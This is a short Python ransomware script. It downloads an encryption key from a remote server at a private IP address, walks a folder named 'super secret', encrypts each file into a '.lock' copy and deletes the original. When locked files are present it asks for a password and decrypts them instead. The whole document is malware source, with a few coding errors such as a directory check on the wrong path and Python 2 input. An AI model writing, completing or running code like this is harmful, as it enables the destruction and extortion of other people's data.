from  cryptography.fernet import Fernet
from requests import get
from os import listdir, getcwd, remove
from os.path import isdir

global fn
global mode
mode = False

def r(path):
    global fn
    global mode
    for i in listdir(path):
        if isdir(i):
            r(path + "\\" + i)
        else:
            if mode == False and i.split(".")[-1] == "lock":
                fn = Fernet(str(raw_input("Password ? ")).encode("utf8"))
                mode = True
            if not mode and i.split(".")[-1] != "lock":
                encrypt(path + "\\" + i)
            else:
                decrypt(path + "\\" + i)

def encrypt(path):
    f = open(path, "r")
    f2 = open(path + ".lock", "w+")
    f2.write(fn.encrypt(f.read().encode("utf8")))
    f.close()
    f2.close()
    remove(path)

def decrypt(path):
    f = open(path, "r")
    p = path.split(".")
    del p[-1]
    f2 = open(".".join(p), "w+")
    f2.write(fn.decrypt(f.read()).decode("utf8"))
    f.close()
    f2.close()
    remove(path)

fn = Fernet(get("http://10.94.4.23/key.php").text.encode("utf8"))
r(getcwd() + "\\super secret")
